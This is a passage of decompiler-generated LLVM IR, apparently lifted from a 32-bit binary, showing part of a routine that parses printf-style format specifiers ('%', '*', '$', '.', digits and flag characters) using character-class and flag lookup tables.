  store i32 %v1_10009278, i32* %r0.global-to-local, align 4
  %v0_10009280 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009280 = add i32 %v0_10009280, -4
  %v2_10009280 = inttoptr i32 %v1_10009280 to i32*
  %v3_10009280 = load i32, i32* %v2_10009280, align 4
  store i32 %v3_10009280, i32* %r9.global-to-local, align 4
  %v4_10009284 = icmp eq i32 %v1_10009278, %v3_10009280
  br i1 %v4_10009284, label %dec_label_pc_1000928c, label %dec_label_pc_100096fc

dec_label_pc_1000928c:                            ; preds = %dec_label_pc_10009260
  %v3_1000927c = icmp eq i32 %v1_10009278, 0
  br i1 %v3_1000927c, label %dec_label_pc_10009294, label %dec_label_pc_10009290

dec_label_pc_10009290:                            ; preds = %dec_label_pc_1000928c
  %v0_10009290 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009290 = add i32 %v0_10009290, -1
  store i32 %v1_10009290, i32* %ctr.global-to-local, align 4
  %v2_10009290 = icmp eq i32 %v1_10009290, 0
  br i1 %v2_10009290, label %dec_label_pc_10009294, label %dec_label_pc_10009290.dec_label_pc_10009260_crit_edge

dec_label_pc_10009290.dec_label_pc_10009260_crit_edge: ; preds = %dec_label_pc_10009290
  %v0_10009260.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_10009264.pre = load i32, i32* @r7, align 4
  %v0_10009268.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10009260

dec_label_pc_10009294:                            ; preds = %dec_label_pc_10009290, %dec_label_pc_1000928c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10009298 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_100092a0

dec_label_pc_100092a0:                            ; preds = %dec_label_pc_10009234, %dec_label_pc_10009294
  %v2_100092b0.pre-phi = phi i32 [ %.pre, %dec_label_pc_10009234 ], [ %v2_1000925c, %dec_label_pc_10009294 ]
  %storemerge3 = phi i32 [ %v2_10009234, %dec_label_pc_10009234 ], [ %v2_10009298, %dec_label_pc_10009294 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* @r27, align 4
  store i32 %v2_100092b0.pre-phi, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100092c0

dec_label_pc_100092bc:                            ; preds = %dec_label_pc_100093cc, %dec_label_pc_10009450
  %v0_100092bc = phi i32 [ %v1_10009450, %dec_label_pc_10009450 ], [ %v0_100093b4, %dec_label_pc_100093cc ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_10009450 ], [ %stack_var_-84.2, %dec_label_pc_100093cc ]
  store i32 %v0_100092bc, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100092c0

dec_label_pc_100092c0:                            ; preds = %dec_label_pc_100092a0, %dec_label_pc_100092bc
  %v0_100092d4 = phi i32 [ %storemerge3, %dec_label_pc_100092a0 ], [ %v0_100092bc, %dec_label_pc_100092bc ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_100092a0 ], [ %stack_var_-84.0, %dec_label_pc_100092bc ]
  %v1_100092c0 = inttoptr i32 %v0_100092d4 to i8*
  %v2_100092c0 = load i8, i8* %v1_100092c0, align 1
  %v3_100092c0 = zext i8 %v2_100092c0 to i32
  store i32 %v3_100092c0, i32* %r0.global-to-local, align 4
  store i32 %v0_100092d4, i32* @r30, align 4
  %v3_100092c8 = icmp eq i8 %v2_100092c0, 42
  br i1 %v3_100092c8, label %dec_label_pc_100092d0, label %dec_label_pc_100092e0

dec_label_pc_100092d0:                            ; preds = %dec_label_pc_100092c0
  %v0_100092d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100092d0 = mul i32 %v0_100092d0, -4
  store i32 %v1_100092d0, i32* %r0.global-to-local, align 4
  %v1_100092d4 = add i32 %v0_100092d4, 1
  store i32 %v1_100092d4, i32* @r30, align 4
  %v0_100092d8 = load i32, i32* @r1, align 4
  %v2_100092d8 = add i32 %v0_100092d8, %v1_100092d0
  store i32 %v2_100092d8, i32* %r9.global-to-local, align 4
  %v0_100092dc = load i32, i32* @r29, align 4
  %v2_100092dc = add i32 %v2_100092d8, 8
  %v3_100092dc = inttoptr i32 %v2_100092dc to i32*
  store i32 %v0_100092dc, i32* %v3_100092dc, align 4
  %v0_100092f8.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100092e0

dec_label_pc_100092e0:                            ; preds = %dec_label_pc_100092c0, %dec_label_pc_100092d0
  %v0_100092f8.pre = phi i32 [ %v0_100092d4, %dec_label_pc_100092c0 ], [ %v0_100092f8.pre.pre, %dec_label_pc_100092d0 ]
  %v3_100092e0 = load i32, i32* @global_var_100249f0, align 4
  store i32 %v3_100092e0, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_100092f8

dec_label_pc_100092ec:                            ; preds = %dec_label_pc_100092f8
  %v2_100092fc = icmp sgt i32 %v0_10009344, 4094
  br i1 %v2_100092fc, label %dec_label_pc_100092f4, label %dec_label_pc_100092f0

dec_label_pc_100092f0:                            ; preds = %dec_label_pc_100092ec
  %v1_100092f0 = add i32 %v2_10009310, -48
  store i32 %v1_100092f0, i32* @r8, align 4
  br label %dec_label_pc_100092f4

dec_label_pc_100092f4:                            ; preds = %dec_label_pc_100092ec, %dec_label_pc_100092f0
  %v0_100092fc15 = phi i32 [ %v0_10009344, %dec_label_pc_100092ec ], [ %v1_100092f0, %dec_label_pc_100092f0 ]
  %v1_100092f4 = add i32 %v0_10009374, 1
  store i32 %v1_100092f4, i32* @r30, align 4
  br label %dec_label_pc_100092f8

dec_label_pc_100092f8:                            ; preds = %dec_label_pc_100092e0, %dec_label_pc_100092f4
  %v0_10009344 = phi i32 [ 0, %dec_label_pc_100092e0 ], [ %v0_100092fc15, %dec_label_pc_100092f4 ]
  %v0_10009374 = phi i32 [ %v0_100092f8.pre, %dec_label_pc_100092e0 ], [ %v1_100092f4, %dec_label_pc_100092f4 ]
  %v1_100092f8 = inttoptr i32 %v0_10009374 to i8*
  %v2_100092f8 = load i8, i8* %v1_100092f8, align 1
  %v3_100092f8 = zext i8 %v2_100092f8 to i32
  store i32 %v3_100092f8, i32* %r11.global-to-local, align 4
  %v1_10009300 = mul nuw nsw i32 %v3_100092f8, 2
  store i32 %v1_10009300, i32* %r9.global-to-local, align 4
  %v2_10009304 = add i32 %v1_10009300, %v3_100092e0
  %v3_10009304 = inttoptr i32 %v2_10009304 to i16*
  %v4_10009304 = load i16, i16* %v3_10009304, align 2
  %v5_10009304 = zext i16 %v4_10009304 to i32
  store i32 %v5_10009304, i32* %r0.global-to-local, align 4
  %v1_10009308 = mul i32 %v0_10009344, 10
  %v1_1000930c = and i32 %v5_10009304, 8
  store i32 %v1_1000930c, i32* @r25, align 4
  %v3_1000930c = icmp eq i32 %v1_1000930c, 0
  %v2_10009310 = add i32 %v3_100092f8, %v1_10009308
  store i32 %v2_10009310, i32* %r9.global-to-local, align 4
  br i1 %v3_1000930c, label %dec_label_pc_10009318, label %dec_label_pc_100092ec

dec_label_pc_10009318:                            ; preds = %dec_label_pc_100092f8
  %v0_10009318 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009318 = add i32 %v0_10009318, -1
  %v2_10009318 = inttoptr i32 %v1_10009318 to i8*
  %v3_10009318 = load i8, i8* %v2_10009318, align 1
  %v4_10009318 = zext i8 %v3_10009318 to i32
  store i32 %v4_10009318, i32* %r0.global-to-local, align 4
  %v3_1000931c = icmp eq i8 %v3_10009318, 37
  br i1 %v3_1000931c, label %dec_label_pc_10009324, label %dec_label_pc_100093ec

dec_label_pc_10009324:                            ; preds = %dec_label_pc_10009318
  %v3_10009324 = icmp eq i8 %v2_100092f8, 36
  br i1 %v3_10009324, label %dec_label_pc_1000932c, label %dec_label_pc_10009360

dec_label_pc_1000932c:                            ; preds = %dec_label_pc_10009324
  %tmp58 = icmp slt i32 %v0_10009344, 1
  br i1 %tmp58, label %dec_label_pc_10009360, label %dec_label_pc_10009334

dec_label_pc_10009334:                            ; preds = %dec_label_pc_1000932c
  %v0_10009334 = load i32, i32* @r26, align 4
  %v3_10009334 = icmp eq i32 %v0_10009334, 0
  %v1_10009338 = add i32 %v0_10009374, 1
  store i32 %v1_10009338, i32* %r10.global-to-local, align 4
  br i1 %v3_10009334, label %dec_label_pc_100096fc, label %dec_label_pc_10009340

dec_label_pc_10009340:                            ; preds = %dec_label_pc_10009334
  %v3_10009340 = icmp sgt i32 %v0_10009344, %v0_10009334
  br i1 %v3_10009340, label %dec_label_pc_1000934c, label %dec_label_pc_10009358

dec_label_pc_1000934c:                            ; preds = %dec_label_pc_10009340
  store i32 %v0_10009344, i32* @r26, align 4
  br label %dec_label_pc_10009358

dec_label_pc_10009354:                            ; preds = %dec_label_pc_1000937c, %dec_label_pc_10009374
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_10009358

dec_label_pc_10009358:                            ; preds = %dec_label_pc_10009340, %dec_label_pc_1000934c, %dec_label_pc_10009354
  %v0_10009358 = phi i32 [ %v0_10009318, %dec_label_pc_10009354 ], [ %v1_10009338, %dec_label_pc_1000934c ], [ %v1_10009338, %dec_label_pc_10009340 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_10009354 ], [ %v0_10009344, %dec_label_pc_1000934c ], [ %v0_10009344, %dec_label_pc_10009340 ]
  br label %dec_label_pc_10009394

dec_label_pc_10009360:                            ; preds = %dec_label_pc_10009324, %dec_label_pc_1000932c
  %v0_10009360 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_10009360, 1
  br i1 %tmp59, label %dec_label_pc_10009374, label %dec_label_pc_10009368

dec_label_pc_10009368:                            ; preds = %dec_label_pc_10009360
  %v3_10009368 = icmp eq i8 %v2_100092f8, 109
  br i1 %v3_10009368, label %dec_label_pc_100093ec, label %dec_label_pc_100096fc

dec_label_pc_10009374:                            ; preds = %dec_label_pc_10009360
  %v3_10009374 = icmp ugt i32 %v0_10009374, %v0_10009318
  br i1 %v3_10009374, label %dec_label_pc_1000937c, label %dec_label_pc_10009354

dec_label_pc_1000937c:                            ; preds = %dec_label_pc_10009374
  %v1_1000937c = inttoptr i32 %v0_10009318 to i8*
  %v2_1000937c = load i8, i8* %v1_1000937c, align 1
  %v3_1000937c = zext i8 %v2_1000937c to i32
  store i32 %v3_1000937c, i32* %r0.global-to-local, align 4
  store i32 %v0_10009318, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10009388 = icmp eq i8 %v2_1000937c, 48
  br i1 %v3_10009388, label %dec_label_pc_10009354, label %dec_label_pc_100093f0

dec_label_pc_10009394:                            ; preds = %dec_label_pc_100093b0, %dec_label_pc_10009358
  %v0_100093b4 = phi i32 [ %v0_10009358, %dec_label_pc_10009358 ], [ %v1_100093b4, %dec_label_pc_100093b0 ]
  store i32 %v0_100093b4, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001299c.584 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_100093a4 = inttoptr i32 %v0_100093b4 to i8*
  br label %dec_label_pc_1000939c

dec_label_pc_1000939c:                            ; preds = %dec_label_pc_100093bc, %dec_label_pc_10009394
  %v1_100093b0 = phi i32 [ %v1_100093c0, %dec_label_pc_100093bc ], [ 1, %dec_label_pc_10009394 ]
  %v0_1000939c = phi i32 [ %v1_100093a0, %dec_label_pc_100093bc ], [ ptrtoint ([8 x i8]* @global_var_1001299c.584 to i32), %dec_label_pc_10009394 ]
  %v1_1000939c = inttoptr i32 %v0_1000939c to i8*
  %v2_1000939c = load i8, i8* %v1_1000939c, align 1
  %v3_1000939c = zext i8 %v2_1000939c to i32
  store i32 %v3_1000939c, i32* %r9.global-to-local, align 4
  %v1_100093a0 = add i32 %v0_1000939c, 1
  store i32 %v1_100093a0, i32* %r11.global-to-local, align 4
  %v2_100093a4 = load i8, i8* %v1_100093a4, align 1
  %v3_100093a4 = zext i8 %v2_100093a4 to i32
  store i32 %v3_100093a4, i32* %r0.global-to-local, align 4
  %v4_100093a8 = icmp eq i8 %v2_100093a4, %v2_1000939c
  br i1 %v4_100093a8, label %dec_label_pc_100093b0, label %dec_label_pc_100093bc

dec_label_pc_100093b0:                            ; preds = %dec_label_pc_1000939c
  %v0_100093b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100093b0 = or i32 %v0_100093b0, %v1_100093b0
  store i32 %v2_100093b0, i32* %r6.global-to-local, align 4
  %v1_100093b4 = add i32 %v0_100093b4, 1
  br label %dec_label_pc_10009394

dec_label_pc_100093bc:                            ; preds = %dec_label_pc_1000939c
  %v1_100093bc = inttoptr i32 %v1_100093a0 to i8*
  %v2_100093bc = load i8, i8* %v1_100093bc, align 1
  %v3_100093bc = zext i8 %v2_100093bc to i32
  store i32 %v3_100093bc, i32* %r0.global-to-local, align 4
  %v1_100093c0 = mul i32 %v1_100093b0, 2
  store i32 %v1_100093c0, i32* %r10.global-to-local, align 4
  %v3_100093c4 = icmp eq i8 %v2_100093bc, 0
  br i1 %v3_100093c4, label %dec_label_pc_100093cc, label %dec_label_pc_1000939c

dec_label_pc_100093cc:                            ; preds = %dec_label_pc_100093bc
  %v1_100093cc = add i32 %v0_100093b4, -1
  %v2_100093cc = inttoptr i32 %v1_100093cc to i8*
  %v3_100093cc = load i8, i8* %v2_100093cc, align 1
  %v4_100093cc = zext i8 %v3_100093cc to i32
  store i32 %v4_100093cc, i32* %r0.global-to-local, align 4
  %v0_100093d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_100093d0 = and i32 %v0_100093d0, 10
  store i32 0, i32* @r8, align 4
  %v3_100093d8 = icmp eq i8 %v3_100093cc, 37
  %v1_100093dc = udiv i32 %v1_100093d0, 2
  store i32 %v1_100093dc, i32* %r9.global-to-local, align 4
  %v2_100093e0 = sub nuw nsw i32 -1, %v1_100093dc
  %v3_100093e0 = and i32 %v0_100093d0, %v2_100093e0
  store i32 %v3_100093e0, i32* %r6.global-to-local, align 4
  br i1 %v3_100093d8, label %dec_label_pc_100093f0, label %dec_label_pc_100092bc

dec_label_pc_100093ec:                            ; preds = %dec_label_pc_10009318, %dec_label_pc_10009368
  store i32 %v0_10009318, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100093f0

dec_label_pc_100093f0:                            ; preds = %dec_label_pc_1000937c, %dec_label_pc_100093cc, %dec_label_pc_100093ec
  %v0_10009424 = phi i32 [ 0, %dec_label_pc_100093cc ], [ %v0_10009344, %dec_label_pc_1000937c ], [ %v0_10009344, %dec_label_pc_100093ec ]
  %v1_10009430 = phi i32 [ %v0_100093b4, %dec_label_pc_100093cc ], [ %v0_10009374, %dec_label_pc_1000937c ], [ %v0_10009374, %dec_label_pc_100093ec ]
  %v0_1000942c = phi i32 [ %v1_100093a0, %dec_label_pc_100093cc ], [ %v0_10009318, %dec_label_pc_1000937c ], [ %v0_10009318, %dec_label_pc_100093ec ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_100093cc ], [ %stack_var_-84.1, %dec_label_pc_1000937c ], [ %stack_var_-84.1, %dec_label_pc_100093ec ]
  %v1_100093f0 = inttoptr i32 %v0_1000942c to i8*
  %v2_100093f0 = load i8, i8* %v1_100093f0, align 1
  %v3_100093f0 = zext i8 %v2_100093f0 to i32
  store i32 %v3_100093f0, i32* %r0.global-to-local, align 4
  %v3_100093f4 = icmp eq i8 %v2_100093f0, 42
  br i1 %v3_100093f4, label %dec_label_pc_100093fc, label %dec_label_pc_1000943c

dec_label_pc_100093fc:                            ; preds = %dec_label_pc_100093f0
  %v0_100093fc = load i32, i32* @r26, align 4
  %v3_100093fc = icmp eq i32 %v0_100093fc, 0
  br i1 %v3_100093fc, label %dec_label_pc_1000942c, label %dec_label_pc_10009404

dec_label_pc_10009404:                            ; preds = %dec_label_pc_100093fc
  %v1_10009404 = inttoptr i32 %v1_10009430 to i8*
  %v2_10009404 = load i8, i8* %v1_10009404, align 1
  %v3_10009404 = zext i8 %v2_10009404 to i32
  store i32 %v3_10009404, i32* %r0.global-to-local, align 4
  %v3_10009408 = icmp eq i8 %v2_10009404, 36
  br i1 %v3_10009408, label %dec_label_pc_10009410, label %dec_label_pc_100096fc

dec_label_pc_10009410:                            ; preds = %dec_label_pc_10009404
  %tmp60 = icmp slt i32 %v0_10009424, 1
  br i1 %tmp60, label %dec_label_pc_100096fc, label %dec_label_pc_10009418

dec_label_pc_10009418:                            ; preds = %dec_label_pc_10009410
  %v0_10009418 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009418 = mul i32 %v0_10009418, -4
  %v1_1000941c = add i32 %v1_10009430, 1
  store i32 %v1_1000941c, i32* @r30, align 4
  %v0_10009420 = load i32, i32* %r3.global-to-local, align 4
  %v2_10009420 = add i32 %v0_10009420, %v1_10009418
  store i32 %v2_10009420, i32* %r9.global-to-local, align 4
  %v2_10009424 = add i32 %v2_10009420, 12
  %v3_10009424 = inttoptr i32 %v2_10009424 to i32*
  store i32 %v0_10009424, i32* %v3_10009424, align 4
  %v0_10009444.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009438

dec_label_pc_1000942c:                            ; preds = %dec_label_pc_100093fc
  %v1_1000942c = add i32 %v0_1000942c, 1
  store i32 %v1_1000942c, i32* %r0.global-to-local, align 4
  %v4_10009430 = icmp eq i32 %v1_1000942c, %v1_10009430
  br i1 %v4_10009430, label %dec_label_pc_10009438, label %dec_label_pc_100096fc

dec_label_pc_10009438:                            ; preds = %dec_label_pc_1000942c, %dec_label_pc_10009418
  %v0_10009444.pre = phi i32 [ %v1_10009430, %dec_label_pc_1000942c ], [ %v0_10009444.pre.pre, %dec_label_pc_10009418 ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000943c

dec_label_pc_1000943c:                            ; preds = %dec_label_pc_100093f0, %dec_label_pc_10009438
  %v0_10009444 = phi i32 [ %v1_10009430, %dec_label_pc_100093f0 ], [ %v0_10009444.pre, %dec_label_pc_10009438 ]
  %v0_10009454 = phi i32 [ %v0_10009424, %dec_label_pc_100093f0 ], [ -2147483648, %dec_label_pc_10009438 ]
  %v0_1000943c = load i32, i32* %r5.global-to-local, align 4
  %v3_1000943c = icmp eq i32 %v0_1000943c, 0
  %v1_10009444 = inttoptr i32 %v0_10009444 to i8*
  br i1 %v3_1000943c, label %dec_label_pc_10009444, label %dec_label_pc_10009468

dec_label_pc_10009444:                            ; preds = %dec_label_pc_1000943c
  %v2_10009444 = load i8, i8* %v1_10009444, align 1
  %v3_10009444 = zext i8 %v2_10009444 to i32
  store i32 %v3_10009444, i32* %r0.global-to-local, align 4
  %v3_10009448 = icmp eq i8 %v2_10009444, 46
  br i1 %v3_10009448, label %dec_label_pc_10009450, label %dec_label_pc_10009460

dec_label_pc_10009450:                            ; preds = %dec_label_pc_10009444
  %v1_10009450 = add i32 %v0_10009444, 1
  store i32 %v0_10009454, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100092bc

dec_label_pc_10009460:                            ; preds = %dec_label_pc_10009444
  store i32 %v0_10009454, i32* @r31, align 4
  br label %dec_label_pc_10009468

dec_label_pc_10009468:                            ; preds = %dec_label_pc_1000943c, %dec_label_pc_10009460
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10009460 ], [ %v0_10009454, %dec_label_pc_1000943c ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  %v2_1000946c = load i8, i8* %v1_10009444, align 1
  %v3_1000946c = zext i8 %v2_1000946c to i32
  store i32 %v3_1000946c, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10012944.585 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009474

dec_label_pc_10009474:                            ; preds = %dec_label_pc_10009480, %dec_label_pc_10009468
  %v0_10009480 = phi i32 [ %v1_10009480, %dec_label_pc_10009480 ], [ ptrtoint ([9 x i8]* @global_var_10012944.585 to i32), %dec_label_pc_10009468 ]
  %v1_10009474 = inttoptr i32 %v0_10009480 to i8*
  %v2_10009474 = load i8, i8* %v1_10009474, align 1
  %v3_10009474 = zext i8 %v2_10009474 to i32
  store i32 %v3_10009474, i32* %r0.global-to-local, align 4
  %v4_10009478 = icmp eq i8 %v2_1000946c, %v2_10009474
  br i1 %v4_10009478, label %dec_label_pc_10009244, label %dec_label_pc_10009480

dec_label_pc_10009480:                            ; preds = %dec_label_pc_10009474
  %v1_10009480 = add i32 %v0_10009480, 1
  %v2_10009480 = inttoptr i32 %v1_10009480 to i8*
  %v3_10009480 = load i8, i8* %v2_10009480, align 1
  %v4_10009480 = zext i8 %v3_10009480 to i32
  store i32 %v4_10009480, i32* %r0.global-to-local, align 4
  store i32 %v1_10009480, i32* %r11.global-to-local, align 4
  %v3_10009484 = icmp eq i8 %v3_10009480, 0
  br i1 %v3_10009484, label %dec_label_pc_1000948c, label %dec_label_pc_10009474

dec_label_pc_1000948c:                            ; preds = %dec_label_pc_10009480, %dec_label_pc_10009244
  %v0_100094b4 = phi i32 [ %v1_10009244, %dec_label_pc_10009244 ], [ %v0_10009444, %dec_label_pc_10009480 ]
  %v0_100094b0 = phi i32 [ %v0_10009480, %dec_label_pc_10009244 ], [ %v1_10009480, %dec_label_pc_10009480 ]
  %v2_10009494 = sub i32 %v0_100094b0, ptrtoint ([9 x i8]* @global_var_10012944.585 to i32)
  store i32 %v2_10009494, i32* %r9.global-to-local, align 4
  %v2_10009498 = icmp sgt i32 %v2_10009494, 1
  br i1 %v2_10009498, label %dec_label_pc_100094b8, label %dec_label_pc_100094a0

dec_label_pc_100094a0:                            ; preds = %dec_label_pc_1000948c
  %v1_100094a0 = inttoptr i32 %v0_100094b4 to i8*
  %v2_100094a0 = load i8, i8* %v1_100094a0, align 1
  %v3_100094a0 = zext i8 %v2_100094a0 to i32
  store i32 %v3_100094a0, i32* %r0.global-to-local, align 4
  %v1_100094a4 = inttoptr i32 %v0_100094b0 to i8*
  %v2_100094a4 = load i8, i8* %v1_100094a4, align 1
  %v3_100094a4 = zext i8 %v2_100094a4 to i32
  store i32 %v3_100094a4, i32* %r9.global-to-local, align 4
  %v4_100094a8 = icmp eq i8 %v2_100094a0, %v2_100094a4
  br i1 %v4_100094a8, label %dec_label_pc_100094b0, label %dec_label_pc_100094b8

dec_label_pc_100094b0:                            ; preds = %dec_label_pc_100094a0
  %v1_100094b0 = add i32 %v0_100094b0, 9
  store i32 %v1_100094b0, i32* %r11.global-to-local, align 4
  %v1_100094b4 = add i32 %v0_100094b4, 1
  store i32 %v1_100094b4, i32* @r30, align 4
  br label %dec_label_pc_100094b8

dec_label_pc_100094b8:                            ; preds = %dec_label_pc_100094a0, %dec_label_pc_1000948c, %dec_label_pc_100094b0
  %v0_100094bc = phi i32 [ %v0_100094b0, %dec_label_pc_100094a0 ], [ %v0_100094b0, %dec_label_pc_1000948c ], [ %v1_100094b0, %dec_label_pc_100094b0 ]
  %v0_100094b8 = phi i32 [ %v0_100094b4, %dec_label_pc_100094a0 ], [ %v0_100094b4, %dec_label_pc_1000948c ], [ %v1_100094b4, %dec_label_pc_100094b0 ]
  %v1_100094b8 = inttoptr i32 %v0_100094b8 to i8*
  %v2_100094b8 = load i8, i8* %v1_100094b8, align 1
  %v3_100094b8 = zext i8 %v2_100094b8 to i32
  store i32 %v3_100094b8, i32* @r7, align 4
  %v1_100094bc = add i32 %v0_100094bc, 9
  %v2_100094bc = inttoptr i32 %v1_100094bc to i8*
  %v3_100094bc = load i8, i8* %v2_100094bc, align 1
  %v4_100094bc = zext i8 %v3_100094bc to i32
  store i32 %v4_100094bc, i32* %r0.global-to-local, align 4
  %v3_100094c0 = icmp eq i8 %v2_100094b8, 0
  %v1_100094c4 = mul nuw nsw i32 %v4_100094bc, 256
  store i32 %v1_100094c4, i32* %r10.global-to-local, align 4
  br i1 %v3_100094c0, label %dec_label_pc_100096fc, label %dec_label_pc_100094cc

dec_label_pc_100094cc:                            ; preds = %dec_label_pc_100094b8
  %v1_100094d0 = and i32 %v1_100094c4, 1024
  store i32 %v1_100094d0, i32* %r0.global-to-local, align 4
  %v3_100094d0 = icmp eq i32 %v1_100094d0, 0
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r3.global-to-local, align 4
  %v3_100094dc = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_100094dc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012978.587 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10012984.586 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100094ec

dec_label_pc_100094ec:                            ; preds = %dec_label_pc_10009550, %dec_label_pc_100094cc
  %v1_100094f8 = phi i32 [ %v1_10009550, %dec_label_pc_10009550 ], [ ptrtoint ([21 x i8]* @global_var_10012984.586 to i32), %dec_label_pc_100094cc ]
  %v1_100094ec = inttoptr i32 %v1_100094f8 to i8*
  %v2_100094ec = load i8, i8* %v1_100094ec, align 1
  %v3_100094ec = zext i8 %v2_100094ec to i32
  store i32 %v3_100094ec, i32* %r0.global-to-local, align 4
  %v4_100094f0 = icmp eq i8 %v2_100094ec, %v2_100094b8
  br i1 %v4_100094f0, label %dec_label_pc_100094f8, label %dec_label_pc_10009550

dec_label_pc_100094f8:                            ; preds = %dec_label_pc_100094ec
  %v2_100094f8 = sub i32 %v1_100094f8, ptrtoint ([21 x i8]* @global_var_10012984.586 to i32)
  %tmp61 = icmp slt i32 %v2_100094f8, 18
  %brmerge = or i1 %v3_100094d0, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000950c, label %dec_label_pc_10009508

dec_label_pc_10009508:                            ; preds = %dec_label_pc_100094f8
  %v1_10009508 = add i32 %v2_100094f8, -2
  br label %dec_label_pc_1000950c

dec_label_pc_1000950c:                            ; preds = %dec_label_pc_100094f8, %dec_label_pc_10009508
  %storemerge = phi i32 [ %v1_10009508, %dec_label_pc_10009508 ], [ %v2_100094f8, %dec_label_pc_100094f8 ]
  %v0_1000950c = phi i32 [ %v1_10009508, %dec_label_pc_10009508 ], [ %v2_100094f8, %dec_label_pc_100094f8 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000950c = load i32, i32* @r28, align 4
  %v2_1000950c = add i32 %v1_1000950c, 32
  %v3_1000950c = inttoptr i32 %v2_1000950c to i32*
  store i32 %v0_1000950c, i32* %v3_1000950c, align 4
  store i32 ptrtoint (i32* @global_var_10012977.588 to i32), i32* %r11.global-to-local, align 4
  %v0_10009518.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009514

dec_label_pc_10009514:                            ; preds = %dec_label_pc_10009514, %dec_label_pc_1000950c
  %v0_10009514 = phi i32 [ %v1_10009514, %dec_label_pc_10009514 ], [ ptrtoint (i32* @global_var_10012977.588 to i32), %dec_label_pc_1000950c ]
  %v1_10009514 = add i32 %v0_10009514, 1
  %v2_10009514 = inttoptr i32 %v1_10009514 to i8*
  %v3_10009514 = load i8, i8* %v2_10009514, align 1
  %v4_10009514 = zext i8 %v3_10009514 to i32
  store i32 %v4_10009514, i32* %r0.global-to-local, align 4
  store i32 %v1_10009514, i32* %r11.global-to-local, align 4
  %v3_10009518 = icmp sgt i32 %v0_10009518.pre, %v4_10009514
  br i1 %v3_10009518, label %dec_label_pc_10009514, label %dec_label_pc_10009520

dec_label_pc_10009520:                            ; preds = %dec_label_pc_10009514
  %v0_10009520 = load i32, i32* %r5.global-to-local, align 4
  %v2_10009520 = sub i32 %v1_10009514, %v0_10009520
  %v1_10009528 = mul i32 %v2_10009520, 2
  store i32 %v1_10009528, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012968.589 to i32), i32* %r9.global-to-local, align 4
  %v2_10009530 = add i32 %v1_10009528, ptrtoint (i32* @global_var_10012968.589 to i32)
  %v3_10009530 = inttoptr i32 %v2_10009530 to i16*
  %v4_10009530 = load i16, i16* %v3_10009530, align 2
  %v5_10009530 = sext i16 %v4_10009530 to i32
  store i32 %v5_10009530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10012958.590 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10012984.586 to i32), i32* @r8, align 4
  %v2_10009540 = add i32 %v1_10009528, ptrtoint (i32* @global_var_10012958.590 to i32)
  %v3_10009540 = inttoptr i32 %v2_10009540 to i16*
  %v4_10009540 = load i16, i16* %v3_10009540, align 2
  %v5_10009540 = sext i16 %v4_10009540 to i32
  store i32 %v5_10009540, i32* %r9.global-to-local, align 4
  %v2_10009544 = or i32 %v5_10009530, %v1_100094c4
  store i32 %v2_10009544, i32* %r0.global-to-local, align 4
  %v2_10009548 = and i32 %v5_10009540, %v2_10009544
  store i32 %v2_10009548, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000955c

dec_label_pc_10009550:                            ; preds = %dec_label_pc_100094ec
  %v1_10009550 = add i32 %v1_100094f8, 1
  %v2_10009550 = inttoptr i32 %v1_10009550 to i8*
  %v3_10009550 = load i8, i8* %v2_10009550, align 1
  %v4_10009550 = zext i8 %v3_10009550 to i32
  store i32 %v4_10009550, i32* %r0.global-to-local, align 4
  store i32 %v1_10009550, i32* @r8, align 4
  %v3_10009554 = icmp eq i8 %v3_10009550, 0
